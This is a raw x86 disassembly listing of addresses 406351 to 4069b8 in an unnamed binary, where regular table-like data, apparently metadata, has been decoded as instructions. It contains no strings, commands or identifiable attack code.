  406351:	00 91 00 69 07 84    	add    %dl,-0x7bf89700(%ecx)
  406357:	00 0b                	add    %cl,(%ebx)
  406359:	00 28                	add    %ch,(%eax)
  40635b:	21 00                	and    %eax,(%eax)
  40635d:	00 00                	add    %al,(%eax)
  40635f:	00 91 00 93 08 89    	add    %dl,-0x76f76d00(%ecx)
  406365:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406368:	b8 2c 00 00 00       	mov    $0x2c,%eax
  40636d:	00 96 00 50 19 0a    	add    %dl,0xa195000(%esi)
  406373:	00 10                	add    %dl,(%eax)
  406375:	00 40 2d             	add    %al,0x2d(%eax)
  406378:	00 00                	add    %al,(%eax)
  40637a:	00 00                	add    %al,(%eax)
  40637c:	96                   	xchg   %eax,%esi
  40637d:	00 a3 02 94 00 10    	add    %ah,0x10009402(%ebx)
  406383:	00 24 2f             	add    %ah,(%edi,%ebp,1)
  406386:	00 00                	add    %al,(%eax)
  406388:	00 00                	add    %al,(%eax)
  40638a:	96                   	xchg   %eax,%esi
  40638b:	00 c4                	add    %al,%ah
  40638d:	04 58                	add    $0x58,%al
  40638f:	00 11                	add    %dl,(%ecx)
  406391:	00 5c 30 00          	add    %bl,0x0(%eax,%esi,1)
  406395:	00 00                	add    %al,(%eax)
  406397:	00 96 00 89 19 9a    	add    %dl,-0x65e67700(%esi)
  40639d:	00 12                	add    %dl,(%edx)
  40639f:	00 c8                	add    %cl,%al
  4063a1:	30 00                	xor    %al,(%eax)
  4063a3:	00 00                	add    %al,(%eax)
  4063a5:	00 91 00 00 0d 9a    	add    %dl,-0x65f30000(%ecx)
  4063ab:	00 13                	add    %dl,(%ebx)
  4063ad:	00 35 21 00 00 00    	add    %dh,0x21
  4063b3:	00 91 18 07 15 0a    	add    %dl,0xa150718(%ecx)
  4063b9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063bc:	10 31                	adc    %dh,(%ecx)
  4063be:	00 00                	add    %al,(%eax)
  4063c0:	00 00                	add    %al,(%eax)
  4063c2:	96                   	xchg   %eax,%esi
  4063c3:	00 0d 0f 0a 00 14    	add    %cl,0x14000a0f
  4063c9:	00 78 20             	add    %bh,0x20(%eax)
  4063cc:	00 00                	add    %al,(%eax)
  4063ce:	00 00                	add    %al,(%eax)
  4063d0:	86 18                	xchg   %bl,(%eax)
  4063d2:	01 15 0e 00 14 00    	add    %edx,0x14000e
  4063d8:	41                   	inc    %ecx
  4063d9:	21 00                	and    %eax,(%eax)
  4063db:	00 00                	add    %al,(%eax)
  4063dd:	00 96 00 3f 17 0a    	add    %dl,0xa173f00(%esi)
  4063e3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063e6:	f8                   	clc
  4063e7:	33 00                	xor    (%eax),%eax
  4063e9:	00 00                	add    %al,(%eax)
  4063eb:	00 91 00 5c 0e 1d    	add    %dl,0x1d0e5c00(%ecx)
  4063f1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063f4:	50                   	push   %eax
  4063f5:	34 00                	xor    $0x0,%al
  4063f7:	00 00                	add    %al,(%eax)
  4063f9:	00 91 00 66 02 1d    	add    %dl,0x1d026600(%ecx)
  4063ff:	00 14 00             	add    %dl,(%eax,%eax,1)
  406402:	a0 34 00 00 00       	mov    0x34,%al
  406407:	00 91 00 4b 14 1d    	add    %dl,0x1d144b00(%ecx)
  40640d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406410:	dc 35 00 00 00 00    	fdivl  0x0
  406416:	91                   	xchg   %eax,%ecx
  406417:	00 e7                	add    %ah,%bh
  406419:	13 1d 00 14 00 20    	adc    0x20001400,%ebx
  40641f:	36 00 00             	add    %al,%ss:(%eax)
  406422:	00 00                	add    %al,(%eax)
  406424:	91                   	xchg   %eax,%ecx
  406425:	00 85 05 1d 00 14    	add    %al,0x14001d05(%ebp)
  40642b:	00 78 20             	add    %bh,0x20(%eax)
  40642e:	00 00                	add    %al,(%eax)
  406430:	00 00                	add    %al,(%eax)
  406432:	86 18                	xchg   %bl,(%eax)
  406434:	01 15 0e 00 14 00    	add    %edx,0x14000e
  40643a:	6c                   	insb   (%dx),%es:(%edi)
  40643b:	36 00 00             	add    %al,%ss:(%eax)
  40643e:	00 00                	add    %al,(%eax)
  406440:	96                   	xchg   %eax,%esi
  406441:	00 ef                	add    %ch,%bh
  406443:	01 c3                	add    %eax,%ebx
  406445:	00 14 00             	add    %dl,(%eax,%eax,1)
  406448:	f0 36 00 00          	lock add %al,%ss:(%eax)
  40644c:	00 00                	add    %al,(%eax)
  40644e:	96                   	xchg   %eax,%esi
  40644f:	00 2f                	add    %ch,(%edi)
  406451:	0d c7 00 14 00       	or     $0x1400c7,%eax
  406456:	5c                   	pop    %esp
  406457:	37                   	aaa
  406458:	00 00                	add    %al,(%eax)
  40645a:	00 00                	add    %al,(%eax)
  40645c:	96                   	xchg   %eax,%esi
  40645d:	00 14 12             	add    %dl,(%edx,%edx,1)
  406460:	53                   	push   %ebx
  406461:	00 15 00 7b 21 00    	add    %dl,0x217b00
  406467:	00 00                	add    %al,(%eax)
  406469:	00 96 00 d7 10 1d    	add    %dl,0x1d10d700(%esi)
  40646f:	00 15 00 18 39 00    	add    %dl,0x391800
  406475:	00 00                	add    %al,(%eax)
  406477:	00 96 00 e7 19 0a    	add    %dl,0xa19e700(%esi)
  40647d:	00 15 00 90 39 00    	add    %dl,0x399000
  406483:	00 00                	add    %al,(%eax)
  406485:	00 96 00 b3 18 c3    	add    %dl,-0x3ce74d00(%esi)
  40648b:	00 15 00 7c 3a 00    	add    %dl,0x3a7c00
  406491:	00 00                	add    %al,(%eax)
  406493:	00 96 00 83 13 d5    	add    %dl,-0x2aec7d00(%esi)
  406499:	00 15 00 c4 3a 00    	add    %dl,0x3ac400
  40649f:	00 00                	add    %al,(%eax)
  4064a1:	00 96 00 79 12 0a    	add    %dl,0xa127900(%esi)
  4064a7:	00 16                	add    %dl,(%esi)
  4064a9:	00 f8                	add    %bh,%al
  4064ab:	3a 00                	cmp    (%eax),%al
  4064ad:	00 00                	add    %al,(%eax)
  4064af:	00 96 00 93 06 c3    	add    %dl,-0x3cf96d00(%esi)
  4064b5:	00 16                	add    %dl,(%esi)
  4064b7:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4064bb:	00 00                	add    %al,(%eax)
  4064bd:	00 96 00 38 1c 1d    	add    %dl,0x1d1c3800(%esi)
  4064c3:	00 16                	add    %dl,(%esi)
  4064c5:	00 91 21 00 00 00    	add    %dl,0x21(%ecx)
  4064cb:	00 96 00 2d 1c 0a    	add    %dl,0xa1c2d00(%esi)
  4064d1:	00 16                	add    %dl,(%esi)
  4064d3:	00 00                	add    %al,(%eax)
  4064d5:	00 00                	add    %al,(%eax)
  4064d7:	00 80 00 96 20 00    	add    %al,0x209600(%eax)
  4064dd:	1c e0                	sbb    $0xe0,%al
  4064df:	00 16                	add    %dl,(%esi)
  4064e1:	00 00                	add    %al,(%eax)
  4064e3:	00 00                	add    %al,(%eax)
  4064e5:	00 80 00 96 20 eb    	add    %al,-0x14df6a00(%eax)
  4064eb:	1b e4                	sbb    %esp,%esp
  4064ed:	00 16                	add    %dl,(%esi)
  4064ef:	00 00                	add    %al,(%eax)
  4064f1:	00 00                	add    %al,(%eax)
  4064f3:	00 80 00 96 20 e6    	add    %al,-0x19df6a00(%eax)
  4064f9:	05 ec 00 19 00       	add    $0x1900ec,%eax
  4064fe:	00 00                	add    %al,(%eax)
  406500:	00 00                	add    %al,(%eax)
  406502:	80 00 96             	addb   $0x96,(%eax)
  406505:	20 01                	and    %al,(%ecx)
  406507:	1b f1                	sbb    %ecx,%esi
  406509:	00 1a                	add    %bl,(%edx)
  40650b:	00 00                	add    %al,(%eax)
  40650d:	00 00                	add    %al,(%eax)
  40650f:	00 80 00 96 20 c0    	add    %al,-0x3fdf6a00(%eax)
  406515:	08 f8                	or     %bh,%al
  406517:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40651a:	00 00                	add    %al,(%eax)
  40651c:	00 00                	add    %al,(%eax)
  40651e:	80 00 96             	addb   $0x96,(%eax)
  406521:	20 7e 0e             	and    %bh,0xe(%esi)
  406524:	ff 00                	incl   (%eax)
  406526:	1d 00 ad 21 00       	sbb    $0x21ad00,%eax
  40652b:	00 00                	add    %al,(%eax)
  40652d:	00 96 00 c7 0b 1c    	add    %dl,0x1c0bc700(%esi)
  406533:	01 20                	add    %esp,(%eax)
  406535:	00 74 3b 00          	add    %dh,0x0(%ebx,%edi,1)
  406539:	00 00                	add    %al,(%eax)
  40653b:	00 96 00 69 19 0a    	add    %dl,0xa196900(%esi)
  406541:	00 22                	add    %ah,(%edx)
  406543:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  40654a:	96                   	xchg   %eax,%esi
  40654b:	00 ef                	add    %ch,%bh
  40654d:	19 0a                	sbb    %ecx,(%edx)
  40654f:	00 22                	add    %ah,(%edx)
  406551:	00 f4                	add    %dh,%ah
  406553:	3b 00                	cmp    (%eax),%eax
  406555:	00 00                	add    %al,(%eax)
  406557:	00 96 00 be 0a 23    	add    %dl,0x230abe00(%esi)
  40655d:	01 22                	add    %esp,(%edx)
  40655f:	00 60 3c             	add    %ah,0x3c(%eax)
  406562:	00 00                	add    %al,(%eax)
  406564:	00 00                	add    %al,(%eax)
  406566:	96                   	xchg   %eax,%esi
  406567:	00 b5 0a 2a 01 24    	add    %dh,0x24012a0a(%ebp)
  40656d:	00 cc                	add    %cl,%ah
  40656f:	3c 00                	cmp    $0x0,%al
  406571:	00 00                	add    %al,(%eax)
  406573:	00 96 00 9e 0a 84    	add    %dl,-0x7bf56200(%esi)
  406579:	00 25 00 34 3d 00    	add    %ah,0x3d3400
  40657f:	00 00                	add    %al,(%eax)
  406581:	00 96 00 ae 1c 1d    	add    %dl,0x1d1cae00(%esi)
  406587:	00 26                	add    %ah,(%esi)
  406589:	00 cd                	add    %cl,%ch
  40658b:	21 00                	and    %eax,(%eax)
  40658d:	00 00                	add    %al,(%eax)
  40658f:	00 91 18 07 15 0a    	add    %dl,0xa150718(%ecx)
  406595:	00 26                	add    %ah,(%esi)
  406597:	00 a0 3d 00 00 00    	add    %ah,0x3d(%eax)
  40659d:	00 96 00 0c 03 9a    	add    %dl,-0x65fcf400(%esi)
  4065a3:	00 26                	add    %ah,(%esi)
  4065a5:	00 d4                	add    %dl,%ah
  4065a7:	3f                   	aas
  4065a8:	00 00                	add    %al,(%eax)
  4065aa:	00 00                	add    %al,(%eax)
  4065ac:	91                   	xchg   %eax,%ecx
  4065ad:	00 95 05 38 01 27    	add    %dl,0x27013805(%ebp)
  4065b3:	00 e3                	add    %ah,%bl
  4065b5:	21 00                	and    %eax,(%eax)
  4065b7:	00 00                	add    %al,(%eax)
  4065b9:	00 91 00 62 03 0a    	add    %dl,0xa036200(%ecx)
  4065bf:	00 28                	add    %ch,(%eax)
  4065c1:	00 13                	add    %dl,(%ebx)
  4065c3:	22 00                	and    (%eax),%al
  4065c5:	00 00                	add    %al,(%eax)
  4065c7:	00 96 00 9d 14 3e    	add    %dl,0x3e149d00(%esi)
  4065cd:	01 28                	add    %ebp,(%eax)
  4065cf:	00 4a 22             	add    %cl,0x22(%edx)
  4065d2:	00 00                	add    %al,(%eax)
  4065d4:	00 00                	add    %al,(%eax)
  4065d6:	91                   	xchg   %eax,%ecx
  4065d7:	18 07                	sbb    %al,(%edi)
  4065d9:	15 0a 00 29 00       	adc    $0x29000a,%eax
  4065de:	f4                   	hlt
  4065df:	40                   	inc    %eax
  4065e0:	00 00                	add    %al,(%eax)
  4065e2:	00 00                	add    %al,(%eax)
  4065e4:	86 18                	xchg   %bl,(%eax)
  4065e6:	01 15 6b 01 29 00    	add    %edx,0x29016b
  4065ec:	56                   	push   %esi
  4065ed:	22 00                	and    (%eax),%al
  4065ef:	00 00                	add    %al,(%eax)
  4065f1:	00 86 00 78 1b 70    	add    %al,0x701b7800(%esi)
  4065f7:	01 2a                	add    %ebp,(%edx)
  4065f9:	00 6c 41 00          	add    %ch,0x0(%ecx,%eax,2)
  4065fd:	00 00                	add    %al,(%eax)
  4065ff:	00 86 00 78 1b 75    	add    %al,0x751b7800(%esi)
  406605:	01 2b                	add    %ebp,(%ebx)
  406607:	00 6e 22             	add    %ch,0x22(%esi)
  40660a:	00 00                	add    %al,(%eax)
  40660c:	00 00                	add    %al,(%eax)
  40660e:	86 00                	xchg   %al,(%eax)
  406610:	70 1b                	jo     0x40662d
  406612:	70 01                	jo     0x406615
  406614:	2c 00                	sub    $0x0,%al
  406616:	c4 42 00             	les    0x0(%edx),%eax
  406619:	00 00                	add    %al,(%eax)
  40661b:	00 86 00 70 1b 75    	add    %al,0x751b7000(%esi)
  406621:	01 2d 00 84 44 00    	add    %ebp,0x448400
  406627:	00 48 00             	add    %cl,0x0(%eax)
  40662a:	81 00 e3 0e 7c 01    	addl   $0x17c0ee3,(%eax)
  406630:	2e 00 86 22 00 00 00 	add    %al,%cs:0x22(%esi)
  406637:	00 91 18 07 15 0a    	add    %dl,0xa150718(%ecx)
  40663d:	00 30                	add    %dh,(%eax)
  40663f:	00 b4 44 00 00 00 00 	add    %dh,0x0(%esp,%eax,2)
  406646:	96                   	xchg   %eax,%esi
  406647:	00 19                	add    %bl,(%ecx)
  406649:	0d c7 00 30 00       	or     $0x3000c7,%eax
  40664e:	40                   	inc    %eax
  40664f:	45                   	inc    %ebp
  406650:	00 00                	add    %al,(%eax)
  406652:	00 00                	add    %al,(%eax)
  406654:	96                   	xchg   %eax,%esi
  406655:	00 19                	add    %bl,(%ecx)
  406657:	0d 84 01 31 00       	or     $0x310184,%eax
  40665c:	9f                   	lahf
  40665d:	22 00                	and    (%eax),%al
  40665f:	00 00                	add    %al,(%eax)
  406661:	00 96 00 3e 16 2a    	add    %dl,0x2a163e00(%esi)
  406667:	01 32                	add    %esi,(%edx)
  406669:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  406670:	96                   	xchg   %eax,%esi
  406671:	00 af 0c 93 01 33    	add    %ch,0x3301930c(%edi)
  406677:	00 80 45 00 00 00    	add    %al,0x45(%eax)
  40667d:	00 96 00 89 0c 93    	add    %dl,-0x6cf37700(%esi)
  406683:	01 34 00             	add    %esi,(%eax,%eax,1)
  406686:	c8 45 00 00          	enter  $0x45,$0x0
  40668a:	00 00                	add    %al,(%eax)
  40668c:	96                   	xchg   %eax,%esi
  40668d:	00 b9 0c 93 01 35    	add    %bh,0x3501930c(%ecx)
  406693:	00 10                	add    %dl,(%eax)
  406695:	46                   	inc    %esi
  406696:	00 00                	add    %al,(%eax)
  406698:	00 00                	add    %al,(%eax)
  40669a:	96                   	xchg   %eax,%esi
  40669b:	00 85 16 84 01 36    	add    %al,0x36018416(%ebp)
  4066a1:	00 b9 22 00 00 00    	add    %bh,0x22(%ecx)
  4066a7:	00 96 00 d6 00 99    	add    %dl,-0x66ff2a00(%esi)
  4066ad:	01 37                	add    %esi,(%edi)
  4066af:	00 c6                	add    %al,%dh
  4066b1:	22 00                	and    (%eax),%al
  4066b3:	00 00                	add    %al,(%eax)
  4066b5:	00 96 00 76 00 9f    	add    %dl,-0x60ff8a00(%esi)
  4066bb:	01 38                	add    %edi,(%eax)
  4066bd:	00 ea                	add    %ch,%dl
  4066bf:	22 00                	and    (%eax),%al
  4066c1:	00 00                	add    %al,(%eax)
  4066c3:	00 96 00 f1 00 a5    	add    %dl,-0x5aff0f00(%esi)
  4066c9:	01 39                	add    %edi,(%ecx)
  4066cb:	00 fe                	add    %bh,%dh
  4066cd:	22 00                	and    (%eax),%al
  4066cf:	00 00                	add    %al,(%eax)
  4066d1:	00 96 00 bd 05 ab    	add    %dl,-0x54fa4300(%esi)
  4066d7:	01 3a                	add    %edi,(%edx)
  4066d9:	00 78 20             	add    %bh,0x20(%eax)
  4066dc:	00 00                	add    %al,(%eax)
  4066de:	00 00                	add    %al,(%eax)
  4066e0:	86 18                	xchg   %bl,(%eax)
  4066e2:	01 15 0e 00 3b 00    	add    %edx,0x3b000e
  4066e8:	0b 23                	or     (%ebx),%esp
  4066ea:	00 00                	add    %al,(%eax)
  4066ec:	00 00                	add    %al,(%eax)
  4066ee:	91                   	xchg   %eax,%ecx
  4066ef:	18 07                	sbb    %al,(%edi)
  4066f1:	15 0a 00 3b 00       	adc    $0x3b000a,%eax
  4066f6:	17                   	pop    %ss
  4066f7:	23 00                	and    (%eax),%eax
  4066f9:	00 00                	add    %al,(%eax)
  4066fb:	00 86 18 01 15 b1    	add    %al,-0x4eeafee8(%esi)
  406701:	01 3b                	add    %edi,(%ebx)
  406703:	00 2d 23 00 00 00    	add    %ch,0x23
  406709:	00 e1                	add    %ah,%cl
  40670b:	09 cb                	or     %ecx,%ebx
  40670d:	1a bb 01 3c 00 40    	sbb    0x40003c01(%ebx),%bh
  406713:	23 00                	and    (%eax),%eax
  406715:	00 00                	add    %al,(%eax)
  406717:	00 e1                	add    %ah,%cl
  406719:	01 b7 1b bf 01 3c    	add    %esi,0x3c01bf1b(%edi)
  40671f:	00 63 23             	add    %ah,0x23(%ebx)
  406722:	00 00                	add    %al,(%eax)
  406724:	00 00                	add    %al,(%eax)
  406726:	e1 01                	loope  0x406729
  406728:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406729:	19 0e                	sbb    %ecx,(%esi)
  40672b:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40672e:	6c                   	insb   (%dx),%es:(%edi)
  40672f:	23 00                	and    (%eax),%eax
  406731:	00 00                	add    %al,(%eax)
  406733:	00 86 18 01 15 cb    	add    %al,-0x34eafee8(%esi)
  406739:	01 3c 00             	add    %edi,(%eax,%eax,1)
  40673c:	82 23 00             	andb   $0x0,(%ebx)
  40673f:	00 00                	add    %al,(%eax)
  406741:	00 86 00 22 03 d7    	add    %al,-0x28fcde00(%esi)
  406747:	01 3e                	add    %edi,(%esi)
  406749:	00 8f 23 00 00 00    	add    %cl,0x23(%edi)
  40674f:	00 86 00 22 03 dc    	add    %al,-0x23fcde00(%esi)
  406755:	01 3e                	add    %edi,(%esi)
  406757:	00 a3 23 00 00 00    	add    %ah,0x23(%ebx)
  40675d:	00 86 00 22 03 e2    	add    %al,-0x1dfcde00(%esi)
  406763:	01 3f                	add    %edi,(%edi)
  406765:	00 b7 23 00 00 00    	add    %dh,0x23(%edi)
  40676b:	00 86 00 22 03 e8    	add    %al,-0x17fcde00(%esi)
  406771:	01 40 00             	add    %eax,0x0(%eax)
  406774:	cb                   	lret
  406775:	23 00                	and    (%eax),%eax
  406777:	00 00                	add    %al,(%eax)
  406779:	00 86 08 d1 0f ee    	add    %al,-0x11f02ef8(%esi)
  40677f:	01 41 00             	add    %eax,0x0(%ecx)
  406782:	d9 23                	fldenv (%ebx)
  406784:	00 00                	add    %al,(%eax)
  406786:	00 00                	add    %al,(%eax)
  406788:	86 08                	xchg   %cl,(%eax)
  40678a:	7d 0d                	jge    0x406799
  40678c:	f4                   	hlt
  40678d:	01 42 00             	add    %eax,0x0(%edx)
  406790:	e6 23                	out    %al,$0x23
  406792:	00 00                	add    %al,(%eax)
  406794:	00 00                	add    %al,(%eax)
  406796:	81 00 92 07 6b 01    	addl   $0x16b0792,(%eax)
  40679c:	42                   	inc    %edx
  40679d:	00 48 46             	add    %cl,0x46(%eax)
  4067a0:	00 00                	add    %al,(%eax)
  4067a2:	00 00                	add    %al,(%eax)
  4067a4:	81 00 c6 12 0e 00    	addl   $0xe12c6,(%eax)
  4067aa:	43                   	inc    %ebx
  4067ab:	00 8c 46 00 00 00 00 	add    %cl,0x0(%esi,%eax,2)
  4067b2:	81 00 1d 03 d7 01    	addl   $0x1d7031d,(%eax)
  4067b8:	43                   	inc    %ebx
  4067b9:	00 b4 46 00 00 00 00 	add    %dh,0x0(%esi,%eax,2)
  4067c0:	81 00 69 0b 0a 02    	addl   $0x20a0b69,(%eax)
  4067c6:	43                   	inc    %ebx
  4067c7:	00 30                	add    %dh,(%eax)
  4067c9:	47                   	inc    %edi
  4067ca:	00 00                	add    %al,(%eax)
  4067cc:	00 00                	add    %al,(%eax)
  4067ce:	86 00                	xchg   %al,(%eax)
  4067d0:	10 19                	adc    %bl,(%ecx)
  4067d2:	dc 01                	faddl  (%ecx)
  4067d4:	44                   	inc    %esp
  4067d5:	00 00                	add    %al,(%eax)
  4067d7:	24 00                	and    $0x0,%al
  4067d9:	00 00                	add    %al,(%eax)
  4067db:	00 81 00 9b 04 d7    	add    %al,-0x28fb6500(%ecx)
  4067e1:	01 45 00             	add    %eax,0x0(%ebp)
  4067e4:	21 24 00             	and    %esp,(%eax,%eax,1)
  4067e7:	00 00                	add    %al,(%eax)
  4067e9:	00 81 00 ac 04 d7    	add    %al,-0x28fb5400(%ecx)
  4067ef:	01 45 00             	add    %eax,0x0(%ebp)
  4067f2:	42                   	inc    %edx
  4067f3:	24 00                	and    $0x0,%al
  4067f5:	00 00                	add    %al,(%eax)
  4067f7:	00 86 00 b1 04 d7    	add    %al,-0x28fb4f00(%esi)
  4067fd:	01 45 00             	add    %eax,0x0(%ebp)
  406800:	5c                   	pop    %esp
  406801:	47                   	inc    %edi
  406802:	00 00                	add    %al,(%eax)
  406804:	00 00                	add    %al,(%eax)
  406806:	81 00 70 12 0f 02    	addl   $0x20f1270,(%eax)
  40680c:	45                   	inc    %ebp
  40680d:	00 24 48             	add    %ah,(%eax,%ecx,2)
  406810:	00 00                	add    %al,(%eax)
  406812:	00 00                	add    %al,(%eax)
  406814:	81 00 4a 1c 0f 02    	addl   $0x20f1c4a,(%eax)
  40681a:	46                   	inc    %esi
  40681b:	00 4a 24             	add    %cl,0x24(%edx)
  40681e:	00 00                	add    %al,(%eax)
  406820:	00 00                	add    %al,(%eax)
  406822:	86 00                	xchg   %al,(%eax)
  406824:	da 13                	ficoml (%ebx)
  406826:	15 02 47 00 5f       	adc    $0x5f004702,%eax
  40682b:	24 00                	and    $0x0,%al
  40682d:	00 00                	add    %al,(%eax)
  40682f:	00 86 00 c2 00 1a    	add    %al,0x1a00c200(%esi)
  406835:	02 48 00             	add    0x0(%eax),%cl
  406838:	d8 48 00             	fmuls  0x0(%eax)
  40683b:	00 00                	add    %al,(%eax)
  40683d:	00 86 00 b6 00 1f    	add    %al,0x1f00b600(%esi)
  406843:	02 49 00             	add    0x0(%ecx),%cl
  406846:	80 49 00 00          	orb    $0x0,0x0(%ecx)
  40684a:	00 00                	add    %al,(%eax)
  40684c:	86 00                	xchg   %al,(%eax)
  40684e:	cd 13                	int    $0x13
  406850:	23 02                	and    (%edx),%eax
  406852:	49                   	dec    %ecx
  406853:	00 28                	add    %ch,(%eax)
  406855:	4a                   	dec    %edx
  406856:	00 00                	add    %al,(%eax)
  406858:	00 00                	add    %al,(%eax)
  40685a:	86 00                	xchg   %al,(%eax)
  40685c:	fa                   	cli
  40685d:	18 27                	sbb    %ah,(%edi)
  40685f:	02 49 00             	add    0x0(%ecx),%cl
  406862:	74 24                	je     0x406888
  406864:	00 00                	add    %al,(%eax)
  406866:	00 00                	add    %al,(%eax)
  406868:	86 00                	xchg   %al,(%eax)
  40686a:	aa                   	stos   %al,%es:(%edi)
  40686b:	16                   	push   %ss
  40686c:	2b 02                	sub    (%edx),%eax
  40686e:	49                   	dec    %ecx
  40686f:	00 bc 4a 00 00 00 00 	add    %bh,0x0(%edx,%ecx,2)
  406876:	86 00                	xchg   %al,(%eax)
  406878:	9f                   	lahf
  406879:	16                   	push   %ss
  40687a:	31 02                	xor    %eax,(%edx)
  40687c:	4a                   	dec    %edx
  40687d:	00 85 24 00 00 00    	add    %al,0x24(%ebp)
  406883:	00 86 00 22 03 36    	add    %al,0x36032200(%esi)
  406889:	02 4a 00             	add    0x0(%edx),%cl
  40688c:	9a 24 00 00 00 00 86 	lcall  $0x8600,$0x24
  406893:	00 22                	add    %ah,(%edx)
  406895:	03 3c 02             	add    (%edx,%eax,1),%edi
  406898:	4c                   	dec    %esp
  406899:	00 6c 4b 00          	add    %ch,0x0(%ebx,%ecx,2)
  40689d:	00 00                	add    %al,(%eax)
  40689f:	00 86 00 8f 16 42    	add    %al,0x42168f00(%esi)
  4068a5:	02 4e 00             	add    0x0(%esi),%cl
  4068a8:	c4 4b 00             	les    0x0(%ebx),%ecx
  4068ab:	00 00                	add    %al,(%eax)
  4068ad:	00 86 00 61 06 42    	add    %al,0x42066100(%esi)
  4068b3:	02 4f 00             	add    0x0(%edi),%cl
  4068b6:	10 4c 00 00          	adc    %cl,0x0(%eax,%eax,1)
  4068ba:	00 00                	add    %al,(%eax)
  4068bc:	86 00                	xchg   %al,(%eax)
  4068be:	30 19                	xor    %bl,(%ecx)
  4068c0:	dc 01                	faddl  (%ecx)
  4068c2:	50                   	push   %eax
  4068c3:	00 b0 24 00 00 00    	add    %dh,0x24(%eax)
  4068c9:	00 86 00 4b 0f 0e    	add    %al,0xe0f4b00(%esi)
  4068cf:	00 51 00             	add    %dl,0x0(%ecx)
  4068d2:	c6                   	(bad)
  4068d3:	24 00                	and    $0x0,%al
  4068d5:	00 00                	add    %al,(%eax)
  4068d7:	00 86 00 a3 0c 6b    	add    %al,0x6b0ca300(%esi)
  4068dd:	01 51 00             	add    %edx,0x0(%ecx)
  4068e0:	d6                   	salc
  4068e1:	24 00                	and    $0x0,%al
  4068e3:	00 00                	add    %al,(%eax)
  4068e5:	00 86 00 97 0c 47    	add    %al,0x470c9700(%esi)
  4068eb:	02 52 00             	add    0x0(%edx),%dl
  4068ee:	f4                   	hlt
  4068ef:	24 00                	and    $0x0,%al
  4068f1:	00 00                	add    %al,(%eax)
  4068f3:	00 86 00 7b 10 4b    	add    %al,0x4b107b00(%esi)
  4068f9:	02 52 00             	add    0x0(%edx),%dl
  4068fc:	09 25 00 00 00 00    	or     %esp,0x0
  406902:	86 00                	xchg   %al,(%eax)
  406904:	3a 06                	cmp    (%esi),%al
  406906:	50                   	push   %eax
  406907:	02 53 00             	add    0x0(%ebx),%dl
  40690a:	1f                   	pop    %ds
  40690b:	25 00 00 00 00       	and    $0x0,%eax
  406910:	86 00                	xchg   %al,(%eax)
  406912:	05 19 55 02 54       	add    $0x54025519,%eax
  406917:	00 cc                	add    %cl,%ah
  406919:	4c                   	dec    %esp
  40691a:	00 00                	add    %al,(%eax)
  40691c:	00 00                	add    %al,(%eax)
  40691e:	86 00                	xchg   %al,(%eax)
  406920:	75 16                	jne    0x406938
  406922:	2b 02                	sub    (%edx),%eax
  406924:	55                   	push   %ebp
  406925:	00 24 4d 00 00 00 00 	add    %ah,0x0(,%ecx,2)
  40692c:	86 00                	xchg   %al,(%eax)
  40692e:	52                   	push   %edx
  40692f:	06                   	push   %es
  406930:	6b 01 56             	imul   $0x56,(%ecx),%eax
  406933:	00 48 4d             	add    %cl,0x4d(%eax)
  406936:	00 00                	add    %al,(%eax)
  406938:	00 00                	add    %al,(%eax)
  40693a:	86 00                	xchg   %al,(%eax)
  40693c:	93                   	xchg   %eax,%ebx
  40693d:	0f                   	(bad)
  40693e:	0f 02 57 00          	lar    0x0(%edi),%edx
  406942:	5c                   	pop    %esp
  406943:	53                   	push   %ebx
  406944:	00 00                	add    %al,(%eax)
  406946:	00 00                	add    %al,(%eax)
  406948:	86 00                	xchg   %al,(%eax)
  40694a:	31 16                	xor    %edx,(%esi)
  40694c:	31 02                	xor    %eax,(%edx)
  40694e:	58                   	pop    %eax
  40694f:	00 c8                	add    %cl,%al
  406951:	53                   	push   %ebx
  406952:	00 00                	add    %al,(%eax)
  406954:	00 00                	add    %al,(%eax)
  406956:	86 00                	xchg   %al,(%eax)
  406958:	62 0f                	bound  %ecx,(%edi)
  40695a:	0f 02 58 00          	lar    0x0(%eax),%ebx
  40695e:	34 25                	xor    $0x25,%al
  406960:	00 00                	add    %al,(%eax)
  406962:	00 00                	add    %al,(%eax)
  406964:	86 08                	xchg   %cl,(%eax)
  406966:	6f                   	outsl  %ds:(%esi),(%dx)
  406967:	0c 47                	or     $0x47,%al
  406969:	02 59 00             	add    0x0(%ecx),%bl
  40696c:	3c 25                	cmp    $0x25,%al
  40696e:	00 00                	add    %al,(%eax)
  406970:	00 00                	add    %al,(%eax)
  406972:	86 08                	xchg   %cl,(%eax)
  406974:	7c 0c                	jl     0x406982
  406976:	6b 01 59             	imul   $0x59,(%ecx),%eax
  406979:	00 45 25             	add    %al,0x25(%ebp)
  40697c:	00 00                	add    %al,(%eax)
  40697e:	00 00                	add    %al,(%eax)
  406980:	86 08                	xchg   %cl,(%eax)
  406982:	b1 13                	mov    $0x13,%cl
  406984:	23 02                	and    (%edx),%eax
  406986:	5a                   	pop    %edx
  406987:	00 4d 25             	add    %cl,0x25(%ebp)
  40698a:	00 00                	add    %al,(%eax)
  40698c:	00 00                	add    %al,(%eax)
  40698e:	86 08                	xchg   %cl,(%eax)
  406990:	bf 13 15 02 5a       	mov    $0x5a021513,%edi
  406995:	00 56 25             	add    %dl,0x25(%esi)
  406998:	00 00                	add    %al,(%eax)
  40699a:	00 00                	add    %al,(%eax)
  40699c:	86 08                	xchg   %cl,(%eax)
  40699e:	e2 18                	loop   0x4069b8
  4069a0:	27                   	daa
  4069a1:	02 5b 00             	add    0x0(%ebx),%bl
  4069a4:	5e                   	pop    %esi
  4069a5:	25 00 00 00 00       	and    $0x0,%eax
  4069aa:	86 08                	xchg   %cl,(%eax)
  4069ac:	ee                   	out    %al,(%dx)
  4069ad:	18 55 02             	sbb    %dl,0x2(%ebp)
  4069b0:	5b                   	pop    %ebx
  4069b1:	00 c0                	add    %al,%al
  4069b3:	54                   	push   %esp
  4069b4:	00 00                	add    %al,(%eax)
  4069b6:	00 00                	add    %al,(%eax)
  4069b8:	86 08                	xchg   %cl,(%eax)
